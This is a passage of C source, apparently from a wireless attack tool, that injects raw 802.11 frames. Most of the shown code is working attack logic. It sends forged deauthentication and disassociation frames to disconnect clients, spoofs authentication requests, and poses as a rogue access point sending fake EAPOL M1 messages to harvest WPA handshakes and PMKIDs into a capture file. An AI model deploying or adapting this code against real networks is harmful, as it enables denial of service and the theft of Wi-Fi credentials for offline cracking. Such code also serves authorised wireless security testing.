else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1f] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2b] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2b] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem_cl(int p)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem(int p)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, macrgclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_pspoll(int p)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_RTS +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_CTL;
macftx->subtype = IEEE80211_STYPE_PSPOLL;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
macftx->power = 1;
macftx->duration = (bssidlist +p)->bssidinfo->aid;
packetoutlen = HDRRT_SIZE +MAC_SIZE_RTS;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_disassociationcurrent2client(uint8_t *macclient, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence > 4095) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +2;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_disassociation2client(int p, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr2, (bssidlist +p)->mac, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence > 4095) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +2;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_deauthentication2ap(int p, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence > 4095) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +2;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_deauthentication2client(int p, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr2, (bssidlist +p)->mac, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence > 4095) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +2;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process80211eapol_m4(uint8_t *wpakptr)
{
static int p;
static wpakey_t *wpak;

tfctimestamp = timestamp;
writeepb(fd_pcapng);
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		wpak = (wpakey_t*)wpakptr;
		if(((bssidlist +p)->bssidinfo->status &BSSID_ESSID) != BSSID_ESSID)
			{
			#ifdef GETM1234
			send_disassociation2client(p, WLAN_REASON_PREV_AUTH_NOT_VALID);
			#endif
			return;
			}
		if(((bssidlist +p)->bssidinfo->replaycountm1 +1) != be64toh(wpak->replaycount))
			{
			#ifdef GETM1234
			if((bssidlist +p)->bssidinfo->status < BSSID_M4) send_disassociation2client(p, WLAN_REASON_PREV_AUTH_NOT_VALID);
			#endif
			return;
			}
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm1) > 60000)
			{
			#ifdef GETM1234
			if((bssidlist +p)->bssidinfo->status < BSSID_M4) send_deauthentication2client(p, WLAN_REASON_4WAY_HANDSHAKE_TIMEOUT);
			#endif
			return;
			}
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm2) > 40000)
			{
			#ifdef GETM1234
			if((bssidlist +p)->bssidinfo->status < BSSID_M4) send_disassociation2client(p, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
			#endif
			return;
			}
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm3) > 20000)
			{
			#ifdef GETM1234
			if((bssidlist +p)->bssidinfo->status < BSSID_M4) send_disassociation2client(p, WLAN_REASON_PREV_AUTH_NOT_VALID);
			#endif
			return;
			}
		#ifdef STATUSOUT
		if(((bssidlist +p)->bssidinfo->status & BSSID_M4) != BSSID_M4) debugmac2(macfrx->addr2, macfrx->addr3, "M1M2M3M4");
		#endif
		(bssidlist +p)->bssidinfo->status |= BSSID_M4;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m3(uint8_t *wpakptr)
{
static int p;
static wpakey_t *wpak;

tfctimestamp = timestamp;
writeepb(fd_pcapng);
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		if(((bssidlist +p)->bssidinfo->status &BSSID_ESSID) != BSSID_ESSID) return;
		(bssidlist +p)->bssidinfo->deauthattackcount = 0;
		wpak = (wpakey_t*)wpakptr;
		if(((bssidlist +p)->bssidinfo->replaycountm1 +1) != be64toh(wpak->replaycount)) return;
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm1) > 40000) return;
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm2) > 20000) return;
		(bssidlist +p)->bssidinfo->timestampm3 = timestamp;
		#ifdef STATUSOUT
		if(((bssidlist +p)->bssidinfo->status & BSSID_M3) != BSSID_M3) debugmac2(macfrx->addr1, macfrx->addr3, "M1M2M3");
		#endif
		(bssidlist +p)->bssidinfo->status |= BSSID_M3;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m2(uint8_t *wpakptr)
{
static int p;
static wpakey_t *wpak;
static uint64_t m2rc;

tfctimestamp = timestamp;
writeepb(fd_pcapng);
wpak = (wpakey_t*)wpakptr;
m2rc = be64toh(wpak->replaycount);
if(rgrc == m2rc)
	{
	for(p = 0; p < CLIENTLIST_MAX; p++)
		{
		if((clientlist +p)->timestamp == 0) return;
		if((memcmp((clientlist +p)->mac, macfrx->addr2, 6) != 0) || (memcmp((clientlist +p)->macap, macfrx->addr1, 6) != 0)) continue;
		(clientlist +p)->timestamp = timestamp;
		if((clientlist +p)->essid != CLIENT_ESSID) return;
		if(memcmp((clientlist +p)->mic, wpak->keymic, 16) == 0) return;
		else
			{
			(clientlist +p)->count += 1;
			memcpy((clientlist +p)->mic, wpak->keymic, 16);
			memset(&mac_pending, 0, 6);
			#ifdef STATUSOUT
			debugmac2(macfrx->addr2, macfrx->addr3, "M1M2ROGUE");
			#endif
			}
		return;
		}
	return;
	}
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		if(((bssidlist +p)->bssidinfo->status &BSSID_ESSID) != BSSID_ESSID) return;
		(bssidlist +p)->bssidinfo->deauthattackcount = 0;
		if((bssidlist +p)->bssidinfo->replaycountm1 != m2rc) return;
		if((timestamp -(bssidlist +p)->bssidinfo->timestampm1) > 20000) return;
		(bssidlist +p)->bssidinfo->timestampm2 = timestamp;
		#ifdef STATUSOUT
		if(((bssidlist +p)->bssidinfo->status & BSSID_M2) != BSSID_M2) debugmac2(macfrx->addr2, macfrx->addr3, "M1M2");
		#endif
		(bssidlist +p)->bssidinfo->status |= BSSID_M2;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_rg_m1(uint16_t authlen, uint8_t *wpakptr)
{
static int p;
static wpakey_t *wpak;
static pmkid_t *pmkid;

tfctimestamp = timestamp;
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		(bssidlist +p)->bssidinfo->deauthattackcount = 0;
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->status |= BSSID_M1;
		(bssidlist +p)->bssidinfo->timestampm1 = timestamp;
		wpak = (wpakey_t*)wpakptr;
		pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
		if(pmkid->id != TAG_VENDOR) return;
		if(authlen < WPAKEY_SIZE +PMKID_SIZE) return;
		if(ntohs(wpak->wpadatalen) < (int)PMKID_SIZE) return;
		if((pmkid->len != 0x14) && (pmkid->type != 0x04)) return;
		if(memcmp(pmkid->pmkid, &zeroed32, 16) == 0) return;
		writeepb(fd_pcapng);
		#ifdef STATUSOUT
		if(((bssidlist +p)->bssidinfo->status &BSSID_PMKID) != BSSID_PMKID) debugmac2(macfrx->addr1, macfrx->addr3, "PMKIDROGUE");
		#endif
		(bssidlist +p)->bssidinfo->status |= BSSID_PMKID;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1(uint16_t authlen, uint8_t *wpakptr)
{
static int p;
static wpakey_t *wpak;
static pmkid_t *pmkid;

tfctimestamp = timestamp;
writeepb(fd_pcapng);
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		if(((bssidlist +p)->bssidinfo->status &BSSID_ESSID) != BSSID_ESSID) return;
		(bssidlist +p)->bssidinfo->deauthattackcount = 0;
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->status |= BSSID_M1;
		(bssidlist +p)->bssidinfo->timestampm1 = timestamp;
		wpak = (wpakey_t*)wpakptr;
		(bssidlist +p)->bssidinfo->replaycountm1 = be64toh(wpak->replaycount);
		pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
		if(pmkid->id != TAG_VENDOR) return;
		if(authlen < WPAKEY_SIZE +PMKID_SIZE) return;
		if(ntohs(wpak->wpadatalen) < (int)PMKID_SIZE) return;
		if((pmkid->len != 0x14) && (pmkid->type != 0x04)) return;
		if(memcmp(pmkid->pmkid, &zeroed32, 16) == 0) return;
		#ifdef STATUSOUT
		if(((bssidlist +p)->bssidinfo->status &BSSID_PMKID) != BSSID_PMKID) debugmac2(macfrx->addr1, macfrx->addr3, "PMKID");
		#endif
		(bssidlist +p)->bssidinfo->status |= BSSID_PMKID;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol(uint16_t authlen)
{
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint16_t keyinfo;

wpakptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
if((keyinfo == 1) && (memcmp(&macrgclient, macfrx->addr1, 6) == 0))
	{
	process80211eapol_rg_m1(authlen, wpakptr);
	return;
	}
if(keyinfo == 1) process80211eapol_m1(authlen, wpakptr);
else if(keyinfo == 2) process80211eapol_m2(wpakptr);
else if(keyinfo == 3) process80211eapol_m3(wpakptr);
else if(keyinfo == 4) process80211eapol_m4(wpakptr);
return;
}
/*===========================================================================*/
static inline void process80211exteap(int authlen)
{
static uint8_t *eapauthptr;
static exteap_t *exteap;
static uint16_t exteaplen;

eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
exteaplen = ntohs(exteap->len);
if(exteaplen > authlen) return;
writeepb(fd_pcapng);
if(exteap->type == EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_REQ)
		{
		}
	else if(exteap->code == EAP_CODE_RESP)
		{
// eintragen
		}
	}
return;
}
/*===========================================================================*/
static inline void send_eap_request_id(uint8_t *macclient, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t eaprequestiddata[] =
{
/* LLC */
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
/* AUTHENTICATION */
0x01, 0x00, 0x00, 0x05,
/* EXTENSIBLE AUTHENTICATION */
0x01, 0x0d, 0x00, 0x05, 0x01
};
#define EAPREQUESTIDDATA_SIZE sizeof(eaprequestiddata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +EAPREQUESTIDDATA_SIZE);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
macfrx->from_ds = 1;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(clientsequence > 4095) apsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &eaprequestiddata, EAPREQUESTIDDATA_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +EAPREQUESTIDDATA_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint16_t eapauthlen;
static uint16_t authlen;

eapauthptr = payloadptr +LLC_SIZE;
eapauthlen = payloadlen -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4)) return;
if(eapauth->type == EAPOL_KEY)
	{
	if(authlen >= WPAKEY_SIZE) process80211eapol(authlen);
	}
else if(eapauth->type == EAP_PACKET) process80211exteap(authlen);
#ifdef GETM2
else if(eapauth->type == EAPOL_START)
	{
	send_eap_request_id(macfrx->addr2, macfrx->addr1);
	}
#endif
return;
}
/*===========================================================================*/
static inline void send_m1_wpa2kv3(uint8_t *macclient, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t wpa2kv3data[] =
{
/* LLC */
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
/* M1 WPA2 kv 3*/
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8b,
0x00, 0x10,
};
#define WPA2KV3_SIZE sizeof(wpa2kv3data)

timestamp += 1;
packetoutptr = epbown_m1 +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +107);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
macftx->from_ds = 1;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &wpa2kv3data, WPA2KV3_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x17] = (rgrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x18] = rgrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x19], &anonce, 32);
writeepbown_m1(fd_pcapng, HDRRT_SIZE +MAC_SIZE_NORM +107);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_m1_wpa2(uint8_t *macclient, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t wpa2data[] =
{
/* LLC */
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
/* M1 WPA2 */
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define WPA2_SIZE sizeof(wpa2data)

timestamp += 1;
packetoutptr = epbown_m1 +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +107);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
macftx->from_ds = 1;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &wpa2data, WPA2_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x17] = (rgrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x18] = rgrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x19], &anonce, 32);
writeepbown_m1(fd_pcapng, HDRRT_SIZE +MAC_SIZE_NORM +107);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_m1_wpa1(uint8_t *macclient, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t wpa1data[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
/* M1 WPA1 */
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x89,
0x00, 0x20,
};
#define WPA1_SIZE sizeof(wpa1data)

timestamp += 1;
packetoutptr = epbown_m1 +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +107);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
macftx->from_ds = 1;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &wpa1data, WPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x17] = (rgrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x18] = rgrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +0x19], &anonce, 32);
writeepbown_m1(fd_pcapng, HDRRT_SIZE +MAC_SIZE_NORM +107);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process80211null()
{
static int p;

if(macfrx->to_ds == 0) return;
#ifdef GETM2
if(memcmp(&mac_pending, macfrx->addr1, 6) == 0)
	{
	if(memcmp(&mac_null, macfrx->addr1, 6) != 0)
		{
		packetoutptr = epbown_m1 +EPB_SIZE;
		packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
		fdwrite();
		return;
		}
	}
#endif
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) return;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211qosnull()
{
static int p;

if(macfrx->to_ds == 0) return;
#ifdef GETM2
if(memcmp(&mac_pending, macfrx->addr1, 6) == 0)
	{
	if(memcmp(&mac_null, macfrx->addr1, 6) != 0)
		{
		packetoutptr = epbown_m1 +EPB_SIZE;
		packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
		fdwrite();
		return;
		}
	}
#endif
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) return;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211pspoll()
{
static int p;

for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) return;
	if(memcmp((bssidlist +p)->mac, macfrx->addr1, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		(bssidlist +p)->bssidinfo->aid = macfrx->duration;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211back()
{
static int p;

for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) break;
	if(memcmp((bssidlist +p)->mac, macfrx->addr1, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211backreq()
{
static int p;

for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) break;
	if(memcmp((bssidlist +p)->mac, macfrx->addr1, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211action()
{
static int p;

if(memcmp(macfrx->addr3, macfrx->addr2, 6) == 0) return;
if(memcmp(&mac_broadcast, macfrx->addr1, 6) == 0) return;
if(memcmp(&mac_broadcast, macfrx->addr2, 6) == 0) return;
#ifdef GETM2
if(memcmp(&mac_pending, macfrx->addr1, 6) == 0)
	{
	if(memcmp(&mac_null, macfrx->addr1, 6) != 0)
		{
		packetoutptr = epbown_m1 +EPB_SIZE;
		packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +107;
		fdwrite();
		}
	}
#endif
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) break;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->timestampclient = timestamp;
		memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
		return;
		}
	}
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211data()
{
static int p;

if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(p = 0; p < BSSIDLIST_MAX; p++)
		{
		if((bssidlist +p)->timestamp == 0) return;
		if(memcmp((bssidlist +p)->mac, macfrx->addr1, 6) == 0)
			{
			(bssidlist +p)->timestamp = timestamp;
			(bssidlist +p)->bssidinfo->timestampclient = timestamp;
			memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
			if(p > 25) qsort(bssidlist, p +1, BSSIDLIST_SIZE, sort_bssidlist_by_time);
			return;
			}
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211reassociation_resp()
{
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void gettagwpa(bssidinfo_t *bssidinfo, int wpalen, uint8_t *ieptr)
{
static int c;
static wpaie_t *wpaptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;

tfctimestamp = timestamp;
wpaptr = (wpaie_t*)ieptr;
wpalen -= WPAIE_SIZE;
ieptr += WPAIE_SIZE;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if(wpaptr->ouitype != 1) return;
if(wpaptr->type != VT_WPA_IE) return;
bssidinfo->kdv |= BSSID_KDV_WPA;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &ouimscorp, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) bssidinfo->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) bssidinfo->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) bssidinfo->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) bssidinfo->groupcipher |= TCS_CCMP;
